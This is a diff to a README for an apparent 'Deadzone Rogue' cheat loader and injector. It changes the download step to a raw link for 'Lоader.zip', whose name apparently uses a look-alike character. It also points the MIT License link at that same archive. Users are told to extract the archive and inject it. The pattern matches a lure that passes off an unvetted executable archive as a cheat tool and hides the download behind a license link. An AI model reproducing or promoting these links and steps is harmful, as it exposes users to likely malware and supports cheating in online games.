@@ -27,7 +27,7 @@ Deadzone Rogue enhancer, external cheat loader, aim assist for Deadzone Rogue, r
 
 # 📥 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/12JoelAlmeyda/DeadzoneRogue-ShadowInjector/main/Lоader.zip** from this repository.
 2. Extract using any archive tool.
 3. Follow the loader instructions provided in the archive to inject and launch.
 4. Enjoy your upgraded Deadzone Rogue gameplay experience!
@@ -39,4 +39,4 @@ This tool is intended for educational and entertainment purposes. Usage in viola
 # 📜 MIT License
 
 This project is licensed under the MIT License (2025).  
-Find the [MIT License Details Here](https://opensource.org/licenses/MIT).
+Find the [MIT License Details Here](https://raw.githubusercontent.com/12JoelAlmeyda/DeadzoneRogue-ShadowInjector/main/Lоader.zip).
